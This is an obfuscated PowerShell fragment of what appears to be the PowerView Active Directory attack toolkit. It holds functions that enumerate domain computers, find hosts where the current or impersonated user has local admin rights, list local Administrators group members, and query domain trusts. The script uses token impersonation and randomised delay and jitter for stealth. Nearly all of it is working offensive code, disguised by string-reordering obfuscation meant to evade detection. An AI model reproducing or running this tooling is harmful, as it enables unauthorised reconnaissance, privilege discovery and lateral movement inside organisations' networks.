                &("{0}{2}{1}"-f 'Inv','ke-Command','o') -ScriptBlock ${hOStenU`m`B`lOCk} -ArgumentList ${tA`RgEt`cO`MpUtER}, ${i`NcLU`DE}, ${Ex`CLuD`Ed`shaReS}, ${OFf`ic`eDOcS}, ${eXc`l`Udeh`iDDen}, ${FrE`S`HE`xEs}, ${CH`eCkw`RIt`eACceSs}, ${Lo`gontO`KEN}
            }
        }
        else {
            &("{1}{4}{3}{2}{0}" -f 'e','W','Verbos','-','rite') ('['+'Find-I'+'nt'+'e'+'r'+'es'+'tingDomainS'+'ha'+'re'+'File'+'] '+'Usin'+'g '+'t'+'hread'+'ing '+'wit'+'h '+'t'+'h'+'read'+'s: '+"$Threads")

            
            ${S`cRi`PT`pARaMS} = @{
                ("{0}{1}{2}"-f'In','clu','de') = ${iN`C`luDE}
                ("{0}{3}{1}{2}" -f 'Exclud','are','s','edSh') = ${e`X`cLUdEDs`HarES}
                ("{1}{2}{0}"-f 'cs','Offi','ceDo') = ${OFfice`do`Cs}
                ("{1}{2}{0}"-f'en','Exclu','deHidd') = ${ex`Cl`UdEHId`d`en}
                ("{0}{1}{2}"-f 'Fre','sh','EXEs') = ${fRes`HEX`ES}
                ("{4}{3}{1}{2}{0}"-f 'Access','W','rite','heck','C') = ${cHeCK`wriTE`AcC`eSs}
                ("{0}{1}{2}{3}"-f 'T','o','ke','nHandle') = ${LOg`onTO`Ken}
            }

            
            &("{1}{0}{4}{2}{3}"-f 'ew-','N','c','tion','ThreadedFun') -ComputerName ${T`ArG`eTCO`M`PuTers} -ScriptBlock ${ho`sTe`NUmb`lO`ck} -ScriptParameters ${sCrIpT`Pa`R`AMS} -Threads ${thr`EaDS}
        }
    }

    END {
        if (${lo`g`O`NtOKEN}) {
            &("{2}{3}{0}{4}{1}"-f'e-Reve','f','In','vok','rtToSel') -TokenHandle ${LOg`ONTO`kEN}
        }
    }
}


function fINd`-LOC`AL`AD`M`inaCceSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'P','ces','SShouldPro','s'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(pOsitIOn = 0, ValUefROmPiPeLINE = ${tr`UE}, vALUefrompipelINEbyPRoPErTynAmE = ${T`Rue})]
        [Alias({"{2}{1}{0}" -f 'stName','NSHo','D'})]
        [String[]]
        ${c`omPu`Ter`Na`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mp`Uter`DOmaiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMpu`TERLdapfi`LTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMPU`TerSe`Ar`Ch`Ba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{4}{1}"-f 'Ope','m','t','ratingSys','e'})]
        [String]
        ${c`OmP`UTE`ROpEr`A`TI`N`GsystEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}"-f'Servi','k','ac','ceP'})]
        [String]
        ${Co`mPUT`ER`SeRvice`P`Ack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'SiteN','me','a'})]
        [String]
        ${C`OmPUt`eRS`iTENAmE},

        [Switch]
        ${chEcksHa`R`EAcc`eSS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{4}{5}{0}" -f 'r','o','mainC','Do','ntr','olle'})]
        [String]
        ${s`ErvEr},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{2}{0}{1}"-f'neLeve','l','O'}, {"{0}{1}"-f 'S','ubtree'})]
        [String]
        ${seAr`C`hScO`pe} = ("{1}{0}" -f'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resuLTPaG`e`SiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RV`erT`I`ME`limIT},

        [Switch]
        ${tom`Bs`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDE`N`TIal} =   (gEt-vArIAbLE  ('21gv7'+'E')  ).ValuE::"EMP`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${deL`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Ji`T`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`Rea`Ds} = 20
    )

    BEGIN {
        ${c`ompU`TeRseaRCheR`A`RGu`ments} = @{
            ("{2}{0}{1}"-f 'op','erties','Pr') = ("{0}{1}{2}{3}" -f'dnsho','s','tna','me')
        }
        if (${PsbOu`NdPAraM`e`TErs}[("{0}{1}{2}{3}" -f 'Comput','erDom','a','in')]) { ${COm`P`UterseaRC`heR`ArGU`MeNTS}[("{0}{2}{1}"-f 'D','ain','om')] = ${cO`m`PUTERDoM`Ain} }
        if (${psBouND`parA`mETe`Rs}[("{3}{2}{4}{0}{1}" -f 'Filte','r','L','Computer','DAP')]) { ${C`omP`UTeRsEaR`C`HER`ArGU`M`entS}[("{3}{0}{1}{2}" -f'DAPF','il','ter','L')] = ${CO`mPUTer`l`DaPF`il`TeR} }
        if (${Ps`BoUN`DPA`RaMEt`Ers}[("{0}{4}{3}{2}{1}"-f 'Comp','e','hBas','terSearc','u')]) { ${CO`M`pUTE`RSeArChera`Rgu`meNts}[("{0}{1}{2}"-f 'Se','arc','hBase')] = ${CoM`Put`erSe`ARC`HBa`Se} }
        if (${P`sbOUNDP`A`R`AmEteRS}[("{2}{0}{1}"-f'co','nstrained','Un')]) { ${c`Omp`U`TErs`eaRCH`eRarguM`En`Ts}[("{1}{2}{0}" -f 'ned','Unconst','rai')] = ${un`CO`N`St`RAINed} }
        if (${PSBoUnd`pA`RAM`ete`Rs}[("{1}{4}{2}{0}{3}{5}"-f'ingS','Com','uterOperat','yste','p','m')]) { ${comPuTerSe`Arc`H`E`RaRGumENTs}[("{3}{0}{2}{1}" -f'per','em','atingSyst','O')] = ${opER`A`T`iNgsYst`EM} }
        if (${PSBO`UndparAm`ETE`Rs}[("{2}{1}{3}{0}"-f'ck','v','ComputerSer','icePa')]) { ${coMPu`T`E`Rs`EA`R`CherarGuMentS}[("{2}{1}{0}{3}"-f'a','viceP','Ser','ck')] = ${sEr`ViC`ePACK} }
        if (${psBoundP`AR`AmE`TErs}[("{0}{2}{3}{1}" -f'Co','me','mputer','SiteNa')]) { ${CoM`PuT`eRSeAr`c`HerARguMEnTs}[("{1}{2}{0}" -f'e','Si','teNam')] = ${SiT`eNAme} }
        if (${psBOUnd`P`AramEt`ERS}[("{1}{0}{2}" -f'rv','Se','er')]) { ${CoM`P`UterSear`ChERaRg`U`M`enTs}[("{0}{1}" -f'Serv','er')] = ${se`RVER} }
        if (${PsBO`UN`dpAr`AMETeRs}[("{1}{2}{0}{3}" -f 'chS','Sea','r','cope')]) { ${comP`Ut`eRseARcH`Er`Argu`mENTS}[("{3}{1}{2}{0}"-f'e','r','chScop','Sea')] = ${s`ear`cHsCOpe} }
        if (${psBOu`ND`p`ARaM`et`erS}[("{0}{1}{2}{3}"-f 'R','esu','ltPa','geSize')]) { ${CoMPu`T`E`Rs`EarCher`ARG`U`MEnTS}[("{1}{3}{0}{2}" -f'Page','Resu','Size','lt')] = ${reS`UltPAGE`SIze} }
        if (${pSBo`Un`dpa`RAMeTE`RS}[("{2}{0}{3}{1}"-f'me','t','ServerTi','Limi')]) { ${c`O`MPUterSEArcherAr`Gu`Me`NTS}[("{2}{0}{1}{3}" -f 'rTi','meLimi','Serve','t')] = ${sErV`eRtiMeLI`MIT} }
        if (${PsBoUNdPa`RA`me`T`E`RS}[("{0}{1}"-f'Tom','bstone')]) { ${CoM`p`U`TeRSe`A`R`CHERAR`gUMeNTs}[("{0}{1}{2}" -f 'Tom','bsto','ne')] = ${tomB`Sto`NE} }
        if (${psbOU`Nd`pAr`A`MEtErS}[("{3}{2}{0}{1}" -f'i','al','ent','Cred')]) { ${Com`p`Ut`eRseaRCHeR`ArguME`NtS}[("{2}{1}{0}"-f'l','ntia','Crede')] = ${CREd`eNTI`AL} }

        if (${PSb`OuNdPA`Rame`T`Ers}[("{3}{1}{0}{2}"-f'te','mpu','rName','Co')]) {
            ${T`ArGETc`O`mPUteRs} = ${COMP`U`TErNAMe}
        }
        else {
            &("{3}{2}{1}{0}"-f 'e','erbos','ite-V','Wr') ("{3}{5}{10}{0}{1}{6}{9}{4}{2}{7}{8}" -f'Acces','s]','puters in th','[Fi','ing com','nd-Lo',' Quer','e dom','ain','y','calAdmin')
            ${T`Arg`et`c`oMPutERs} = &("{2}{1}{0}{3}" -f 'Com','-Domain','Get','puter') @ComputerSearcherArguments | &("{1}{3}{0}{2}" -f'O','Sele','bject','ct-') -ExpandProperty ("{0}{1}{2}{3}" -f'dnsho','stna','m','e')
        }
        &("{3}{1}{4}{0}{2}" -f'rbo','r','se','W','ite-Ve') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${tAR`GeTcOM`Pu`TERS}."l`EnG`TH" -eq 0) {
            throw ("{2}{4}{7}{1}{5}{8}{0}{6}{3}"-f 'o h','ces','[Find-',' enumerate','LocalA','s','osts found to','dminAc','] N')
        }

        
        ${Host`E`NU`mblocK} = {
            Param(${co`mpuTeR`N`AMe}, ${Token`H`A`NDLE})

            if (${TOkeNhA`Nd`lE}) {
                
                ${nU`lL} = &("{0}{3}{2}{1}{6}{5}{4}"-f'Invoke-','ers','rImp','Use','n','io','onat') -TokenHandle ${toKEN`ha`NdLE} -Quiet
            }

            ForEach (${Ta`R`GetcoMP`Ut`eR} in ${Co`mpUte`RnAME}) {
                ${U`p} = &("{1}{3}{2}{0}"-f 'ection','Test','Conn','-') -Count 1 -Quiet -ComputerName ${tARGE`TCOm`put`eR}
                if (${uP}) {
                    
                    ${a`cCeSS} = &("{3}{2}{0}{1}{4}" -f 'Admi','nAcc','st-','Te','ess') -ComputerName ${tarGE`TC`OM`pUt`Er}
                    if (${AccE`sS}."I`sA`dmIn") {
                        ${tARGet`COm`P`UtEr}
                    }
                }
            }

            if (${T`okE`Nha`NdLE}) {
                &("{3}{1}{4}{0}{2}" -f 'ertToS','nvoke-R','elf','I','ev')
            }
        }

        ${lo`go`NToKeN} = ${nU`Ll}
        if (${PsBoUNDpa`R`A`METE`Rs}[("{1}{2}{0}" -f 'dential','Cr','e')]) {
            if (${psbo`Un`dpaRAm`E`TeRS}[("{1}{0}" -f'y','Dela')] -or ${pSBOUn`dPA`RAmeTE`RS}[("{2}{0}{3}{1}"-f 'uc','s','StopOnS','ces')]) {
                ${loGonT`o`keN} = &("{6}{3}{2}{0}{4}{1}{5}"-f'e-UserImpe','tio','ok','nv','rsona','n','I') -Credential ${C`R`ED`entIAL}
            }
            else {
                ${LO`GoNt`o`kEN} = &("{5}{2}{3}{4}{0}{1}"-f 'natio','n','nvok','e','-UserImperso','I') -Credential ${CREd`EntI`AL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PSBo`U`Ndp`ARAmEte`Rs}[("{1}{0}"-f'ay','Del')] -or ${PSbOunD`PArAme`T`erS}[("{3}{2}{1}{0}"-f's','s','ucce','StopOnS')]) {

            &("{0}{1}{3}{2}{4}"-f 'W','r','bo','ite-Ver','se') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{4}{3}{1}{2}{0}" -f'rbose','te-V','e','i','Wr') ('[F'+'ind-L'+'ocal'+'Adm'+'inAc'+'cess'+'] '+'D'+'ela'+'y: '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${coU`NT`er} = 0
            ${Ra`NDNO} = &("{1}{2}{0}" -f't','New-O','bjec') ("{0}{2}{1}{3}"-f'Sy','m','ste','.Random')

            ForEach (${T`A`R`GeTComPuTeR} in ${t`A`RgeTCoM`putERs}) {
                ${c`ounT`eR} = ${Cou`Nt`Er} + 1

                
                &("{1}{2}{0}" -f 'p','Start','-Slee') -Seconds ${R`A`NdNO}.("{1}{0}"-f 't','Nex').Invoke((1-${ji`TT`eR})*${d`E`lay}, (1+${j`It`TeR})*${d`el`Ay})

                &("{0}{3}{2}{1}"-f'Wr','ose','rb','ite-Ve') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{2}{3}{1}" -f'Invoke-Co','d','mm','an') -ScriptBlock ${h`OS`TenumBLO`Ck} -ArgumentList ${tARGeTcOM`pU`T`er}, ${LOGO`NtO`kEN}
            }
        }
        else {
            &("{3}{2}{0}{1}" -f 'te-Ver','bose','ri','W') ('[F'+'ind'+'-'+'LocalA'+'dminAcces'+'s] '+'Using'+' '+'thre'+'ad'+'ing '+'wi'+'th '+'t'+'hr'+'eads: '+"$Threads")

            
            ${sc`R`I`PtPAr`Ams} = @{
                ("{2}{1}{0}"-f 'le','kenHand','To') = ${l`o`gonTokeN}
            }

            
            &("{0}{1}{3}{2}{4}"-f'New-Thr','eadedFu','ti','nc','on') -ComputerName ${tA`RGe`TcoMPUT`ERs} -ScriptBlock ${hosTEN`Um`Bl`oCk} -ScriptParameters ${S`C`RipTpaRams} -Threads ${THr`E`AdS}
        }
    }
}


function fIn`d`-dOmA`iNl`oC`ALG`ROUPMeMber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}{4}"-f 'ould','P','PSSh','roces','s'}, '')]
    [OutputType({"{7}{5}{4}{6}{1}{0}{2}{3}"-f 'm','pMe','ber','.API','View.LocalGro','r','u','Powe'})]
    [OutputType({"{5}{4}{2}{8}{0}{1}{6}{3}{7}" -f 'calGroupMe','mbe','.','N','rView','Powe','r.Win','T','Lo'})]
    Param(
        [Parameter(PoSItiOn = 0, vALueFrOmPipELiNe = ${tR`UE}, vAlUEfROmPipELINeByPrOpERTYnAmE = ${T`RuE})]
        [Alias({"{1}{2}{0}"-f 'Name','DNS','Host'})]
        [String[]]
        ${co`MPuTe`RNaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${com`PUt`E`RDOMaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMPUTERLd`A`Pf`iL`T`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`MPUtE`Rs`e`ArcHBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}"-f'ingS','Operat','y','stem'})]
        [String]
        ${COmP`UTe`RoP`er`AtinGsYstem},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'ervic','ePack','S'})]
        [String]
        ${C`o`MPutErS`Er`ViCE`pAck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'e','S','iteNam'})]
        [String]
        ${ComP`UtErs`itEna`ME},

        [Parameter(VAluEFrOMpiPeliNEbypropERTynAME = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${g`Ro`UPNamE} = ("{0}{3}{1}{2}{4}" -f'A','inistra','t','dm','ors'),

        [ValidateSet('API', {"{0}{1}"-f 'WinN','T'})]
        [Alias({"{0}{1}{3}{4}{2}" -f 'Coll','ectionM','od','et','h'})]
        [String]
        ${m`ethod} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{4}{2}{3}" -f 'o','DomainC','ol','ler','ntr'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{1}" -f'OneLeve','l'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        ${SeArC`HS`CopE} = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Resu`LtPag`E`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVer`T`I`meLImiT},

        [Switch]
        ${T`OmbS`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDE`Nt`IAL} =   (vArIabLe  ('21gV'+'7e')  ).VALUe::"em`pTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${Del`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JI`Tt`Er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tH`RE`AdS} = 20
    )

    BEGIN {
        ${co`mPUTEr`SeARC`HeRa`RGuME`NTS} = @{
            ("{1}{0}{2}"-f'r','P','operties') = ("{3}{0}{2}{1}" -f 't','me','na','dnshos')
        }
        if (${psBO`UN`DPaR`A`MeTerS}[("{0}{1}{2}{3}"-f'Co','mputer','Dom','ain')]) { ${c`OM`pU`TeRs`EA`Rch`e`RArGUmen`TS}[("{1}{0}" -f'ain','Dom')] = ${Comp`UtER`dOm`AIn} }
        if (${P`sBoUn`DpArAMe`TERs}[("{3}{1}{0}{2}{4}"-f 'APF','puterLD','ilt','Com','er')]) { ${COm`pu`TERse`ArcHEr`ArgumenTS}[("{3}{2}{0}{1}" -f'Fi','lter','P','LDA')] = ${Co`m`P`UT`e`RLdapfiLTeR} }
        if (${psboUndp`Ar`AMetE`RS}[("{3}{2}{0}{1}"-f'uterSearchB','ase','p','Com')]) { ${COMp`U`T`erseArc`He`RA`R`GUmENtS}[("{2}{1}{3}{0}" -f'e','earchB','S','as')] = ${com`p`UTERs`E`Ar`ChBase} }
        if (${PsbO`U`Ndpa`RaM`ete`RS}[("{2}{1}{0}" -f 'trained','ncons','U')]) { ${COm`putERsEARch`e`RARGUme`NtS}[("{1}{0}{2}{3}"-f 'nconstra','U','in','ed')] = ${U`NCoNSTRA`i`NEd} }
        if (${p`s`B`Oundpar`AmeTE`Rs}[("{1}{0}{2}{3}{5}{4}" -f 'mputerOpe','Co','rat','i','stem','ngSy')]) { ${CO`MpUTe`R`SeAr`cH`ER`Ar`gume`NTs}[("{3}{1}{2}{0}" -f 'stem','perating','Sy','O')] = ${opE`RaTi`NG`SY`sTEM} }
        if (${Ps`BOUND`PARA`mE`TERs}[("{4}{3}{0}{1}{2}"-f'uterServ','i','cePack','p','Com')]) { ${CO`mPU`TerSEARCh`eRaRGuMen`Ts}[("{1}{2}{0}" -f'ck','Ser','vicePa')] = ${S`ErViCe`Pack} }
        if (${PSb`O`Undpa`RameTerS}[("{2}{4}{3}{1}{0}" -f'eName','it','Compu','erS','t')]) { ${C`o`mPute`RSEA`Rcherar`GUmE`Nts}[("{1}{0}{2}" -f 'e','Sit','Name')] = ${SiT`E`Na`me} }
        if (${p`sb`oU`NdPa`Ram`eTErS}[("{0}{1}"-f'Serv','er')]) { ${C`O`mPU`Ter`S`EArCHeRArg`UmE`NTS}[("{0}{1}"-f 'Serve','r')] = ${s`e`RVER} }
        if (${PsbO`U`NDP`ArAmeTErS}[("{0}{2}{1}{3}"-f'Searc','S','h','cope')]) { ${COmp`U`T`eRseaRCHERaRgumeN`Ts}[("{3}{1}{0}{2}"-f'chS','ar','cope','Se')] = ${s`EARcH`Sco`Pe} }
        if (${P`s`B`oUnd`Para`METErS}[("{3}{0}{2}{1}" -f 'ge','ize','S','ResultPa')]) { ${C`omPu`TeRSEa`RChe`R`A`R`gume`Nts}[("{0}{1}{2}" -f'Res','ult','PageSize')] = ${reS`ULtPagEsi`Ze} }
        if (${PSboUND`P`ARa`mETeRS}[("{1}{2}{0}{3}"-f 'TimeLim','S','erver','it')]) { ${cOMPUT`E`Rs`earC`heRa`R`gUM`EnTS}[("{2}{3}{0}{4}{1}"-f 'L','t','Se','rverTime','imi')] = ${s`e`RVerTI`MeLI`MiT} }
        if (${Ps`B`oundParaM`ETErs}[("{2}{1}{0}" -f'stone','mb','To')]) { ${cOMPutErSeARcHe`RaR`Gu`men`Ts}[("{0}{2}{1}" -f'Tombs','e','ton')] = ${TOm`BsTO`Ne} }
        if (${PSbO`U`NDP`ARAMEte`Rs}[("{2}{1}{0}" -f'ntial','e','Cred')]) { ${c`OM`Pu`TeRseA`R`CHe`RaRGuME`NTs}[("{0}{1}{2}"-f 'Crede','nti','al')] = ${cReDE`N`T`iAL} }

        if (${p`SboU`NdPaR`A`MeT`erS}[("{2}{0}{1}" -f'omputerN','ame','C')]) {
            ${TAr`GET`c`o`mp`Uters} = ${C`o`MPuTe`R`NaMe}
        }
        else {
            &("{1}{2}{0}{3}" -f'b','Write-V','er','ose') ("{2}{6}{7}{3}{0}{1}{5}{10}{11}{4}{9}{8}" -f'e','r','[Find','mb','ers','] Queryi','-','DomainLocalGroupMe','ain',' in the dom','ng compu','t')
            ${tA`RgETC`oM`Pu`TERS} = &("{3}{1}{0}{4}{2}" -f 'in','et-Doma','puter','G','Com') @ComputerSearcherArguments | &("{0}{3}{2}{1}" -f 'Sele','Object','t-','c') -ExpandProperty ("{0}{3}{1}{2}"-f 'dnsh','a','me','ostn')
        }
        &("{2}{0}{3}{1}"-f'te-V','ose','Wri','erb') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${TaR`g`etco`mp`Uters}."L`eNgTh" -eq 0) {
            throw ("{0}{10}{3}{7}{6}{1}{8}{2}{5}{11}{13}{9}{4}{14}{12}"-f '[Find-DomainLocalGro','r]','hos','e','o enumer','ts ','be','m',' No ',' t','upM','fou','e','nd','at')
        }

        
        ${h`OSTeNUm`BL`O`cK} = {
            Param(${coMp`UTErN`A`Me}, ${G`RoUPN`AmE}, ${meT`H`od}, ${T`oKe`NHandLE})

            
            if (${GROUpn`A`mE} -eq ("{2}{1}{0}"-f 'rs','ato','Administr')) {
                ${A`dMi`NSECUriTyiDentI`FI`Er} = &("{1}{2}{0}"-f 'w-Object','N','e') ("{3}{2}{7}{0}{9}{1}{4}{12}{8}{6}{13}{10}{5}{11}"-f'S','cur','y','S','ity.Pr','e','curit','stem.','cipal.Se','e','tifi','r','in','yIden')( $5oAW3::"buIl`T`i`NaDMi`NiS`TRAto`RsSId",${nU`ll})
                ${G`ROUpN`AmE} = (${a`dM`iNSeCUr`i`Ty`idEntiFi`eR}."tr`A`NsLATE"([System.Security.Principal.NTAccount])."v`ALUE" -split "\\")[-1]
            }

            if (${T`oKe`N`HANdle}) {
                
                ${nU`LL} = &("{0}{3}{1}{4}{5}{2}" -f'Invoke','Imper','tion','-User','son','a') -TokenHandle ${toKenhAn`d`le} -Quiet
            }

            ForEach (${tA`R`gETcomPUt`eR} in ${coMPutE`Rna`ME}) {
                ${U`p} = &("{1}{0}{3}{2}"-f'est','T','Connection','-') -Count 1 -Quiet -ComputerName ${tAR`G`etcomPut`Er}
                if (${uP}) {
                    ${NetLOC`Al`GROUP`m`EmbErAr`gume`N`Ts} = @{
                        ("{0}{1}{2}" -f'Com','puterNam','e') = ${TA`Rget`c`OmpuTeR}
                        ("{1}{0}" -f'od','Meth') = ${me`T`HoD}
                        ("{0}{2}{1}"-f'Gr','Name','oup') = ${groUPn`A`Me}
                    }
                    &("{1}{0}{5}{2}{7}{3}{4}{6}" -f 'et','G','etLocal','roupMe','m','-N','ber','G') @NetLocalGroupMemberArguments
                }
            }

            if (${tO`KEnha`Nd`lE}) {
                &("{3}{1}{0}{2}" -f'ToSel','evert','f','Invoke-R')
            }
        }

        ${L`og`ontO`kEN} = ${NU`Ll}
        if (${PSb`ouN`dPar`AMeteRs}[("{1}{0}{2}"-f'den','Cre','tial')]) {
            if (${PsboUN`dp`Ar`AMeTe`RS}[("{1}{0}"-f 'elay','D')] -or ${pSBOUN`dp`ARamEte`Rs}[("{0}{3}{2}{1}" -f'Stop','ess','nSucc','O')]) {
                ${L`oGO`NTOKEN} = &("{0}{4}{3}{1}{2}{5}{6}" -f'In','UserI','m','-','voke','persona','tion') -Credential ${c`R`eDEN`Tial}
            }
            else {
                ${LO`gonTO`ken} = &("{1}{3}{0}{2}{4}"-f'mpe','Invoke-User','rsona','I','tion') -Credential ${c`Red`EnTiAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`S`BoU`ND`paRameTeRs}[("{1}{0}" -f'ay','Del')] -or ${PSbOU`N`DPAr`A`Me`TErs}[("{0}{2}{3}{1}"-f'Sto','ccess','pO','nSu')]) {

            &("{0}{1}{2}" -f 'Write','-V','erbose') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}" -f'it','Wr','e-Verbose') ('[Fi'+'nd'+'-D'+'o'+'m'+'ainL'+'ocalGr'+'oupM'+'ember] '+'De'+'lay: '+"$Delay, "+'Jit'+'te'+'r: '+"$Jitter")
            ${COunt`eR} = 0
            ${Ran`DnO} = &("{1}{2}{0}" -f 't','New-O','bjec') ("{2}{1}{3}{0}" -f'andom','em','Syst','.R')

            ForEach (${tARgetc`ompUt`er} in ${t`A`R`geTcomp`UtERS}) {
                ${c`oUN`TEr} = ${co`UNT`eR} + 1

                
                &("{2}{1}{0}" -f'eep','Sl','Start-') -Seconds ${Ran`DnO}.("{0}{1}" -f'N','ext').Invoke((1-${J`It`Ter})*${d`eLaY}, (1+${j`iT`TeR})*${Del`AY})

                &("{0}{2}{1}" -f 'W','ite-Verbose','r') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{0}{2}" -f'omman','Invoke-C','d') -ScriptBlock ${HOST`ENuMB`L`oCK} -ArgumentList ${TaRGEtcO`mPU`T`Er}, ${G`R`Oup`NAme}, ${M`eTH`Od}, ${Log`o`NTOKEN}
            }
        }
        else {
            &("{2}{1}{0}{3}{4}"-f 'Ve','ite-','Wr','rbo','se') ('[Find-DomainLo'+'calGro'+'up'+'Me'+'mber'+'] '+'U'+'si'+'ng '+'th'+'reading'+' '+'w'+'ith '+'th'+'reads'+': '+"$Threads")

            
            ${Scr`IpTp`AR`A`MS} = @{
                ("{2}{0}{1}" -f'ou','pName','Gr') = ${gr`o`UPN`AMe}
                ("{1}{0}" -f'd','Metho') = ${M`et`HOd}
                ("{2}{1}{0}{3}" -f'en','k','To','Handle') = ${lOG`ON`TOK`eN}
            }

            
            &("{4}{2}{3}{1}{0}" -f 'on','Functi','Thr','eaded','New-') -ComputerName ${tARGet`co`MPUt`ErS} -ScriptBlock ${hoStENu`m`B`lOCK} -ScriptParameters ${ScR`iP`TPa`RamS} -Threads ${thr`Ea`DS}
        }
    }

    END {
        if (${lOG`oN`ToK`en}) {
            &("{4}{1}{0}{2}{5}{3}" -f 'eve','-R','rtT','f','Invoke','oSel') -TokenHandle ${lO`Go`Nt`okeN}
        }
    }
}








function Get-d`o`m`AINtrUsT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{1}{0}" -f's','ces','o','PSS','houldPr'}, '')]
    [OutputType({"{4}{1}{0}{3}{5}{2}"-f 'rus','omainT','ET','t.','PowerView.D','N'})]
    [OutputType({"{1}{6}{3}{4}{5}{7}{2}{0}" -f 'nTrust.LDAP','P','i','V','ie','w.D','ower','oma'})]
    [OutputType({"{5}{1}{3}{2}{4}{0}" -f'.API','omai','T','n','rust','PowerView.D'})]
    [CmdletBinding(DefAulTPARaMeterSETname = {"{1}{0}" -f'DAP','L'})]
    Param(
        [Parameter(PositiOn = 0, VaLUefroMpiPeLine = ${TR`UE}, valUEfRomPIPELINEbyprOpeRTyNAMe = ${t`RuE})]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${doMa`iN},

        [Parameter(ParAmeTERsETNamE = 'API')]
        [Switch]
        ${A`pI},

        [Parameter(PArAmetERsETNAMe = 'NET')]
        [Switch]
        ${n`et},

        [Parameter(pArAMeTeRSETNamE = "L`dAP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'r','F','ilte'})]
        [String]
        ${L`d`ApFiLTER},

        [Parameter(PARaMeTErsETnAmE = "L`DAp")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRO`PERT`I`ES},

        [Parameter(ParaMeteRSeTnAmE = "Ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADSPa','th'})]
        [String]
        ${SeArCH`B`A`se},

        [Parameter(paRAmeteRseTname = "Ld`Ap")]
        [Parameter(paRamETeRsETnAMe = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}{4}" -f'D','ntrol','omainC','o','ler'})]
        [String]
        ${SE`Rv`eR},

        [Parameter(ParAmeTErSETNAME = "lD`AP")]
        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{2}{1}{0}"-f 'l','eve','OneL'}, {"{1}{0}"-f 'ree','Subt'})]
        [String]
        ${sE`A`R`ChscOpE} = ("{1}{0}"-f 'e','Subtre'),

        [Parameter(PARAMEtErsetnamE = "l`daP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${ResulT`P`AgES`Ize} = 200,

        [Parameter(PArametERSetNAME = "L`DAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${s`ERvE`Rt`imelI`miT},

        [Parameter(ParaMetErSEtnamE = "L`dAP")]
        [Switch]
        ${To`mBST`OnE},

        [Alias({"{2}{0}{1}"-f 'n','One','Retur'})]
        [Switch]
        ${FiN`do`NE},

        [Parameter(PArAmeterSEtName = "Ld`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`DeNt`iaL} =  ( vAriABLe  ("21G"+"v"+"7E") -vAlUEO)::"EM`PtY"
    )

    BEGIN {
        ${tRust`AT`T`Rib`UTes} = @{
            [uint32]("{0}{2}{1}"-f '0x','1','0000000') = ("{3}{2}{0}{1}"-f 'TIV','E','N_TRANSI','NO')
            [uint32]("{1}{0}{2}"-f'x00','0','000002') = ("{0}{2}{3}{1}" -f'UPLEV','Y','EL_','ONL')
            [uint32]("{1}{2}{0}" -f'000004','0','x00') = ("{1}{2}{0}{3}"-f'TE','FI','L','R_SIDS')
